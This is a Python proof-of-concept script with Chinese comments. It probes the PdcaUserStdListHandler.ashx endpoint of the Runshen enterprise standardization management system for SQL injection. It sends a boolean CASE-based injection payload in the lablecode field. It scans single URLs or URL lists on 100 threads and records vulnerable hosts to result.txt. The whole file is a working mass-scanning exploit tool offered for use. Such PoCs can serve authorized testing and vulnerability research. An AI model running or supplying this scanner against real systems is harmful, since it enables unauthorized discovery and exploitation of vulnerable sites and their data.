import requests,argparse,sys,json
from multiprocessing.dummy import Pool
from urllib.parse import quote
import warnings
from requests.packages import urllib3
# 关闭警告
urllib3.disable_warnings()

def poc(target):

    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target   

    payload="/PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy"

    header= {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip',
        'Connection': 'close'

    }

    data="""code=1&lablecode=(SELECT (CASE WHEN (4490=4490) THEN 94 ELSE (SELECT 5346 UNION SELECT 2744) END))&LableNam=&page=1&rows=20"""


    re1=requests.get(url=target,headers=header,verify=False)
    try:

        if re1.status_code==200:
            re2= requests.get(url=target+payload,timeout=5,data=data,headers=header,verify=False)
            #判断条件
            #print(re2.text)
            if  json.loads(re2.text)["total"]==0:
                print(f"[+]该网站{target}存在sql漏洞")

                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('润申sql'+target+'\n')
            else:
                print(f"[-]该网站{target}不存在sql漏洞")
        else:
            print(f"[*]该网站{target}访问有问题")
    except:
        pass

def main():
    
    parse = argparse.ArgumentParser(description="润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx SQL注入漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()